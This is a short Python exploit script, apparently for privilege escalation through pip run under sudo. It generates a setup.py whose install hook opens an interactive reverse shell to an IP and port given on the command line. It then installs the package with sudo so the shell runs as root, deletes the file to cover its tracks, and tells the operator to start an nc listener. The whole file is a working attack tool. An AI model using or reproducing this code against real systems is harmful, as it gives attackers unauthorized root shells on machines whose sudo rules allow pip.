import sys
import time
import os


def createSetup(ip, port):
  code = '''#privilege escalation using pip
from setuptools import setup
from setuptools.command.install import install
import os
class CustomInstall(install):
  def run(self):
    install.run(self)
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("{0}",{1}))
    os.dup2(s.fileno(),0) 
    os.dup2(s.fileno(),1) 
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
setup(cmdclass='''.format(ip,port)+'''{'''+''''install': CustomInstall'''+'''}'''+''')'''

  f = open('setup.py', 'w')
  f.write(code)
  f.close()

try:
  IP = sys.argv[1]
  PORT = sys.argv[2] 
  PIP_PATH = sys.argv[3]
except:
  print("<USAGE> python3 pip_exp.py <IP> <PORT> <PIP_PATH>")
  exit()

print("[+] Start Listner on {0} : nc -nvlp {1}".format(IP, PORT))
print("[+] exploiting pip please wait...")
createSetup(IP, PORT)
print("[+] enjoy your shell ;) Thank you")
os.system("sudo {0} install . --upgrade --force-reinstall > /dev/null".format(PIP_PATH))
os.remove("setup.py")

